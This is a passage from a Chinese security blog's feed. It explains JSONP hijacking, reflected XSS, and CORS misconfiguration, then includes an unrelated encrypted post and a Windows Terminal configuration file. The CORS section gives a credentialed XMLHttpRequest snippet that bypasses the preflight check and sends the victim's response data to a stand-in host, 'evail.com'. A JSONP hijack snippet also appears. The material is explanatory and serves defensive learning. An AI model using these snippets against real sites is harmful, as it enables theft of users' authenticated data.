</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>则此时 而此时b.com 响应报文返回的json数据为：jsonp_callback({“result”:{“data”:{“token”:”18623163885dedec5decbab1.37745340”}}});然后a.com能够获取返回的数据</p><hr><h2 id="jsonp开发实践中经常会出现的一些问题"><a href="#jsonp开发实践中经常会出现的一些问题" class="headerlink" title="jsonp开发实践中经常会出现的一些问题"></a>jsonp开发实践中经常会出现的一些问题</h2><ol><li><p>未正确设置响应报文头Content-Type 而导致的反射型XSS一般来说，默认的响应报文头<code>Content-Type:text/html</code>，则此时容易产生反射型xss，从而进一步获取数据。因此我们可通过设置Content-Type为<code>application/json</code>指明返回的报文体是json格式的，避免浏览器解析执行。这个主要是后端是根据前面传入的callback参数的，因此可能导致反射型xss 。</p></li><li><p>JSONP劫持：有些web应用，尤其是同域名下的不同子域之间，通过JSONP方式传输敏感信息，例如用户信息、支付信息、鉴权token等，就要关注JSONP劫持问题了。</p></li></ol><p>一个简单的劫持的代码片段，对于这种jsonp劫持问题，一般企业是对返回的数据做了脱敏处理。尤其对于 姓名 身份证号 手机号 银行卡号之类的个人敏感信息一般只保留其中的几个字符，其他用*号代替。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; <span class="function"><span class="keyword">function</span> <span class="title">jsonp_callback</span>(<span class="params">msg</span>)</span>&#123;      </span><br><span class="line">   <span class="comment">//alert(msg);        </span></span><br><span class="line">   do_evilSomething();<span class="comment">//发送敏感数据  &#125;</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src =http:/</span><span class="regexp">/b.com/g</span>etinfo?callback=jsonp_callback type=<span class="string">"text/javascript"</span> &gt; <span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>不得不提到，JSONP跨域数据传输只能通过GET方式，下面再介绍另外一种跨域方法—CORS。</p><hr><h2 id="cors"><a href="#cors" class="headerlink" title="cors"></a>cors</h2><p>&emsp;&emsp; 我们常说的跨域资源共享(CORS) 是一种机制，它使用额外的 HTTP 头来告诉浏览器让运行在一个 origin (domain) 上的Web应用被准许访问来自不同源服务器上的指定的资源。当一个资源从与该资源本身所在的服务器不同的域、协议或端口请求一个资源时，资源会发起一个跨域 HTTP 请求。但是浏览器决定是否阻断此次请求是要看被跨域请求的网站（b.com）的返回头header中是否包含“授权访问标头”—Access-Control-Allow-Origin。</p><p>一个cors请求代码示例：</p><p><img src="https://img-blog.csdnimg.cn/20200515155329679.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200515155343926.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 响应中响应首部字段 Access-Control-Allow-Origin: * 表明，该资源可以被任意外域访问。如果服务端仅允许来自 <a href="http://foo.example" target="_blank" rel="noopener">http://foo.example</a> 的访问，该首部字段的内容如下：Access-Control-Allow-Origin: <a href="http://foo.example" target="_blank" rel="noopener">http://foo.example</a> 。</p><p>&emsp;&emsp; 当然这次请求会成功，但是当我们把上面的代码片段中:<br>xmlhttp.setRequestHeader(“Content-Type”,”application/json”);<br>我们会发现浏览器会多一步操作就是先发送一个 OPTIONS方法请求，通常也称为预请求。火狐等浏览器规定是以下情况的请求需要先进行“预检”。<br>&emsp;&emsp; 当请求满足下述任一条件时，即应首先发送预检请求：<br>Content-Type 的值不属于下列之一:</p><blockquote><p>application/x-www-form-urlencoded<br>multipart/form-data<br>text/plain</p></blockquote><p>&emsp;&emsp; 使用了下面任一 HTTP 方法：<code>PUT DELETE CONNECT OPTIONS TRACE PATCH</code>，还有人为设置了对 CORS 安全的首部字段集合之外的其他首部字段等。如果需要跨域请求带上被请求域的Cookie，则需要响应中响应首部字段：<code>Access-Control-Allow-Credentials: true</code> ，但同时浏览器为了安全起见，同时和<code>Access-Control-Allow-Origin: *</code>使用请求会被直接阻断。</p><h2 id="CORS中开发误配置所导致的安全问题："><a href="#CORS中开发误配置所导致的安全问题：" class="headerlink" title="CORS中开发误配置所导致的安全问题："></a>CORS中开发误配置所导致的安全问题：</h2><p>（1）Access-Control-Allow-Origin 误配置获取敏感数据<br>一般有些应用确实不允许跨域，但若web中间件（例如nginx）上被误配置（尤其和其它应用使用同一个nginx做反向代理【add_header ‘Access-Control-Allow-Origin’ $origin;】）就会造成本级应用被强制允许跨域。<br>(2）本级应用允许跨域，但编写正则可绕过<br>(3)    绕过预检请求的写操作CSRF<br>&emsp;&emsp; 假如应用A与应用B的某个接口之间(数据传输使用json格式)存在跨域资源共享，但应用B未校验Content-Type，因此可通过XMLHttpRequest设置<code>Content-Type为&quot;text/plain&quot;</code>绕过预检请求<br>&emsp;&emsp; 携带cookie发送请求报文到B的服务端。（若浏览器发现B返回的报文头没有<code>Access-Control-Allow-Origin</code>和<code>Access-Control-Allow-Credentials: true</code>字段，则不允许读取返回的数据）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonreq</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"https://www.b.com/getuserinfo"</span>, <span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"text/plain"</span>);<span class="comment">//注意这里</span></span><br><span class="line">xmlhttp.send(<span class="literal">null</span>);</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line"><span class="keyword">var</span> res= xhr.responseText; <span class="comment">// 读取返回的数据 </span></span><br><span class="line">location=<span class="string">'http://evail.com?param='</span>+res; </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">jsonreq();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;﻿# 第一期&lt;/p&gt;
&lt;h2 id=&quot;逻辑漏洞挖掘&quot;&gt;&lt;a href=&quot;#逻辑漏洞挖掘&quot; class=&quot;headerlink&quot; title=&quot;逻辑漏洞挖掘&quot;&gt;&lt;/a&gt;逻辑漏洞挖掘&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp; 逻辑漏洞中的认证缺失和认证缺陷漏洞，主要指功能级访问控
      
    
    </summary>
    
    
      <category term="笔记" scheme="https://summersec.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>记一次面试题</title>
    <link href="https://summersec.github.io/2020/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <id>https://summersec.github.io/2020/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%A2%98/</id>
    <published>2020-07-15T11:01:42.000Z</published>
    <updated>2020-11-01T15:34:30.071Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="bbade943b565fb416235f91f8fe345a8046f20e7a1d95c59660dd70631f19ca2"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="笔记" scheme="https://summersec.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows Terminal 配置文件</title>
    <link href="https://summersec.github.io/2020/07/01/Windows%20Terminal%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"/>
    <id>https://summersec.github.io/2020/07/01/Windows%20Terminal%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</id>
    <published>2020-07-01T11:01:42.000Z</published>
    <updated>2020-07-20T11:23:17.882Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// To view the default settings, hold "alt" while clicking on the "Settings" button.</span></span><br><span class="line"><span class="comment">// For documentation on these settings, see: https://aka.ms/terminal-documentation</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"$schema"</span>: <span class="string">"https://aka.ms/terminal-profiles-schema"</span>,</span><br><span class="line"><span class="comment">// 默认打开窗口guid</span></span><br><span class="line"><span class="string">"defaultProfile"</span>: <span class="string">"&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;"</span>,</span><br><span class="line"><span class="string">"profiles"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Make changes here to the cmd.exe profile</span></span><br><span class="line"><span class="string">"guid"</span>: <span class="string">"&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"CMD"</span>,</span><br><span class="line"><span class="string">"commandline"</span>: <span class="string">"cmd.exe"</span>,</span><br><span class="line"><span class="string">"hidden"</span>: <span class="keyword">false</span>,</span><br><span class="line"><span class="string">"acrylicOpacity"</span>: <span class="number">0.75</span>,</span><br><span class="line"><span class="comment">// 背景图片</span></span><br><span class="line"><span class="string">"backgroundImage"</span>: <span class="string">"D:\\Git\\icon\\13.jpg"</span>,</span><br><span class="line"><span class="string">"backgroundImageOpacity"</span>: <span class="number">0.9</span>,</span><br><span class="line"><span class="string">"closeOnExit"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"colorScheme"</span>: <span class="string">"CMD"</span>,</span><br><span class="line"><span class="comment">//"commandline": "cmd.exe",</span></span><br><span class="line"><span class="string">"cursorColor"</span>: <span class="string">"#FFFFFF"</span>,</span><br><span class="line"><span class="comment">// 光标</span></span><br><span class="line"><span class="string">"cursorShape"</span>: <span class="string">"underscore"</span>,</span><br><span class="line"><span class="string">"fontFace"</span>: <span class="string">"Consolas"</span>,</span><br><span class="line"><span class="string">"fontSize"</span>: <span class="number">12</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">"historySize"</span>: <span class="number">9001</span>,</span><br><span class="line"><span class="string">"icon"</span>: <span class="string">"ms-appx:///ProfileIcons/&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;.png"</span>,</span><br><span class="line"><span class="comment">//"name": "cmd",</span></span><br><span class="line"><span class="string">"padding"</span>: <span class="string">"0, 0, 0, 0"</span>,</span><br><span class="line"><span class="string">"snapOnInput"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="comment">// 打开窗口的路径</span></span><br><span class="line"><span class="string">"startingDirectory"</span>: <span class="string">"./"</span>,</span><br><span class="line"><span class="string">"tabTitle"</span>: <span class="string">"CMD"</span>,</span><br><span class="line"><span class="string">"useAcrylic"</span>: <span class="keyword">false</span></span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Make changes here to the powershell.exe profile</span></span><br><span class="line"><span class="string">"guid"</span>: <span class="string">"&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Windows PowerShell"</span>,</span><br><span class="line"><span class="string">"commandline"</span>: <span class="string">"powershell.exe"</span>,</span><br><span class="line"><span class="string">"hidden"</span>: <span class="keyword">false</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"acrylicOpacity"</span>: <span class="number">0.5</span>,</span><br><span class="line"><span class="string">"background"</span>: <span class="string">"#000000"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"backgroundImage"</span>: <span class="string">"D:\\Git\\icon\\7s'd.jpg"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"backgroundImageOpacity"</span>: <span class="number">0.9</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"closeOnExit"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"colorScheme"</span>: <span class="string">"CMD"</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">// "commandline": "powershell.exe",</span></span><br><span class="line"><span class="string">"cursorColor"</span>: <span class="string">"#FFFFFF"</span>,</span><br><span class="line"><span class="comment">// 光标</span></span><br><span class="line"><span class="string">"cursorShape"</span>: <span class="string">"underscore"</span>,</span><br><span class="line"><span class="string">"fontFace"</span>: <span class="string">"Consolas"</span>,</span><br><span class="line"><span class="string">"fontSize"</span>: <span class="number">12</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"historySize"</span>: <span class="number">9001</span>,</span><br><span class="line"><span class="string">"icon"</span>: <span class="string">"ms-appx:///ProfileIcons/&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;.png"</span>,</span><br><span class="line"><span class="string">"padding"</span>: <span class="string">"0, 0, 0, 0"</span>,</span><br><span class="line"><span class="string">"snapOnInput"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"startingDirectory"</span>: <span class="string">"./"</span>,</span><br><span class="line"><span class="string">"tabTitle"</span>: <span class="string">"Powershell"</span>,</span><br><span class="line"><span class="string">"useAcrylic"</span>: <span class="keyword">true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"guid"</span>: <span class="string">"&#123;b453ae62-4e3d-5e58-b989-0a998ec441b8&#125;"</span>,</span><br><span class="line"><span class="string">"hidden"</span>: <span class="keyword">false</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Azure Cloud Shell"</span>,</span><br><span class="line"><span class="string">"source"</span>: <span class="string">"Windows.Terminal.Azure"</span></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//git-bash</span></span><br><span class="line"><span class="string">"tabTitle"</span>: <span class="string">"Git-bash"</span>,</span><br><span class="line"><span class="string">"acrylicOpacity"</span>: <span class="number">0.5</span>,</span><br><span class="line"><span class="string">"backgroundImage"</span>: <span class="string">"D:\\Git\\icon\\3.jpg"</span>,</span><br><span class="line"><span class="string">"closeOnExit"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"colorScheme"</span>: <span class="string">"Brogrammer"</span>,</span><br><span class="line"><span class="string">"commandline"</span>: <span class="string">"D:\\Git\\bin\\bash.exe"</span>,</span><br><span class="line"><span class="string">"cursorColor"</span>: <span class="string">"#FFFFFF"</span>,</span><br><span class="line"><span class="string">"cursorShape"</span>: <span class="string">"bar"</span>,</span><br><span class="line"><span class="string">"fontFace"</span>: <span class="string">"Fira Code Medium"</span>,</span><br><span class="line"><span class="string">"fontSize"</span>: <span class="number">12</span>,</span><br><span class="line"><span class="string">"guid"</span>: <span class="string">"&#123;1c4de342-38b7-51cf-b940-2309a097f489&#125;"</span>,</span><br><span class="line"><span class="string">"historySize"</span>: <span class="number">9001</span>,</span><br><span class="line"><span class="comment">// "icon": "E:\\Git\\git-icon.png", </span></span><br><span class="line"><span class="string">"icon"</span>: <span class="string">"D:\\Git\\icon\\1.jpg"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Bash"</span>,</span><br><span class="line"><span class="string">"padding"</span>: <span class="string">"10, 10, 10, 10"</span>,</span><br><span class="line"><span class="string">"snapOnInput"</span>: <span class="keyword">true</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"startingDirectory"</span>: <span class="string">"./"</span>,</span><br><span class="line"><span class="string">"useAcrylic"</span>: <span class="keyword">true</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"tabTitle"</span>: <span class="string">"Ubuntu (WSL)"</span>,</span><br><span class="line"><span class="comment">//"tabTitle": "Ubuntu (WSL)",</span></span><br><span class="line"><span class="string">"acrylicOpacity"</span>: <span class="number">0.1</span>,</span><br><span class="line"><span class="string">"backgroundImage"</span>: <span class="string">"D:\\Git\\icon\\4.jpg"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"backgroundImageOpacity"</span>: <span class="number">0.9</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"closeOnExit"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"colorScheme"</span>: <span class="string">"Campbell"</span>,</span><br><span class="line"><span class="comment">//"colorScheme": "CMD",</span></span><br><span class="line"><span class="string">"commandline"</span>: <span class="string">"wsl.exe -d Ubuntu"</span>,</span><br><span class="line"><span class="string">"cursorColor"</span>: <span class="string">"#FFFFFF"</span>,</span><br><span class="line"><span class="string">"cursorShape"</span>: <span class="string">"bar"</span>,</span><br><span class="line"><span class="string">"fontFace"</span>: <span class="string">"Consolas"</span>,</span><br><span class="line"><span class="string">"fontSize"</span>: <span class="number">13</span>,</span><br><span class="line"><span class="string">"guid"</span>: <span class="string">"&#123;2c4de342-38b7-51cf-b940-2309a097f518&#125;"</span>,</span><br><span class="line"><span class="string">"historySize"</span>: <span class="number">9001</span>,</span><br><span class="line"><span class="string">"icon"</span>: <span class="string">"ms-appx:///ProfileIcons/&#123;9acb9455-ca41-5af7-950f-6bca1bc9722f&#125;.png"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Ubuntu"</span>,</span><br><span class="line"><span class="string">"padding"</span>: <span class="string">"0, 0, 0, 0"</span>,</span><br><span class="line"><span class="string">"snapOnInput"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"useAcrylic"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"startingDirectory"</span>: <span class="string">"./"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">],</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add custom color schemes to this array</span></span><br><span class="line"><span class="string">"schemes"</span>: [</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"background"</span>: <span class="string">"#000000"</span>,</span><br><span class="line"><span class="string">"black"</span>: <span class="string">"#0C0C0C"</span>,</span><br><span class="line"><span class="string">"blue"</span>: <span class="string">"#0037DA"</span>,</span><br><span class="line"><span class="string">"brightBlack"</span>: <span class="string">"#767676"</span>,</span><br><span class="line"><span class="string">"brightBlue"</span>: <span class="string">"#3B78FF"</span>,</span><br><span class="line"><span class="string">"brightCyan"</span>: <span class="string">"#61D6D6"</span>,</span><br><span class="line"><span class="string">"brightGreen"</span>: <span class="string">"#16C60C"</span>,</span><br><span class="line"><span class="string">"brightPurple"</span>: <span class="string">"#B4009E"</span>,</span><br><span class="line"><span class="string">"brightRed"</span>: <span class="string">"#E74856"</span>,</span><br><span class="line"><span class="string">"brightWhite"</span>: <span class="string">"#F2F2F2"</span>,</span><br><span class="line"><span class="string">"brightYellow"</span>: <span class="string">"#F9F1A5"</span>,</span><br><span class="line"><span class="string">"cyan"</span>: <span class="string">"#3A96DD"</span>,</span><br><span class="line"><span class="string">"foreground"</span>: <span class="string">"#FFFFFF"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"green"</span>: <span class="string">"#13A10E"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"CMD"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"purple"</span>: <span class="string">"#881798"</span>,</span><br><span class="line"><span class="string">"red"</span>: <span class="string">"#C50F1F"</span>,</span><br><span class="line"><span class="string">"white"</span>: <span class="string">"#CCCCCC"</span>,</span><br><span class="line"><span class="string">"yellow"</span>: <span class="string">"#C19C00"</span></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"background"</span>: <span class="string">"#000000"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"black"</span>: <span class="string">"#0C0C0C"</span>,</span><br><span class="line"><span class="string">"blue"</span>: <span class="string">"#0037DA"</span>,</span><br><span class="line"><span class="string">"brightBlack"</span>: <span class="string">"#767676"</span>,</span><br><span class="line"><span class="string">"brightBlue"</span>: <span class="string">"#3B78FF"</span>,</span><br><span class="line"><span class="string">"brightCyan"</span>: <span class="string">"#61D6D6"</span>,</span><br><span class="line"><span class="string">"brightGreen"</span>: <span class="string">"#16C60C"</span>,</span><br><span class="line"><span class="string">"brightPurple"</span>: <span class="string">"#B4009E"</span>,</span><br><span class="line"><span class="string">"brightRed"</span>: <span class="string">"#E74856"</span>,</span><br><span class="line"><span class="string">"brightWhite"</span>: <span class="string">"#F2F2F2"</span>,</span><br><span class="line"><span class="string">"brightYellow"</span>: <span class="string">"#F9F1A5"</span>,</span><br><span class="line"><span class="string">"cyan"</span>: <span class="string">"#3A96DD"</span>,</span><br><span class="line"><span class="string">"foreground"</span>: <span class="string">"#FFFFFF"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"green"</span>: <span class="string">"#13A10E"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Brogrammer"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"purple"</span>: <span class="string">"#881798"</span>,</span><br><span class="line"><span class="string">"red"</span>: <span class="string">"#C50F1F"</span>,</span><br><span class="line"><span class="string">"white"</span>: <span class="string">"#CCCCCC"</span>,</span><br><span class="line"><span class="string">"yellow"</span>: <span class="string">"#C19C00"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">],</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add any keybinding overrides to this array.</span></span><br><span class="line"><span class="comment">// To unbind a default keybinding, set the command to "unbound"</span></span><br><span class="line"><span class="string">"keybindings"</span>: [</span><br><span class="line"><span class="comment">// 关闭所有的窗口</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"command"</span>: <span class="string">"closeWindow"</span>,</span><br><span class="line"><span class="string">"keys"</span>: [ <span class="string">"ctrl+q"</span> ]</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 新建一个窗口</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"command"</span>: &#123;</span><br><span class="line"><span class="string">"action"</span>: <span class="string">"newTab"</span>,</span><br><span class="line"><span class="string">"commandline"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="string">"startingDirectory"</span>: <span class="string">"./"</span>,</span><br><span class="line"><span class="string">"tabTitle"</span>: <span class="string">"CMD"</span>,</span><br><span class="line"><span class="string">"index"</span>: <span class="number">0</span>,</span><br><span class="line"><span class="string">"profile"</span>: <span class="string">"CMD"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">"keys"</span>: [ <span class="string">"alt+q"</span> ]</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 复制快捷键</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"command"</span>: &#123;</span><br><span class="line"><span class="string">"action"</span>: <span class="string">"copy"</span>,</span><br><span class="line"><span class="string">"singleLine"</span>: <span class="keyword">false</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">"keys"</span>: [ <span class="string">"ctrl+c"</span> ]</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 粘贴快捷键</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"command"</span>: <span class="string">"paste"</span>,</span><br><span class="line"><span class="string">"keys"</span>: [ <span class="string">"ctrl+v"</span> ]</span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line"><span class="comment">// 关闭当前选项卡</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"command"</span>: <span class="string">"closeTab"</span>,</span><br><span class="line"><span class="string">"keys"</span>: [</span><br><span class="line"><span class="string">"shift+q"</span></span><br><span class="line">]</span><br><span 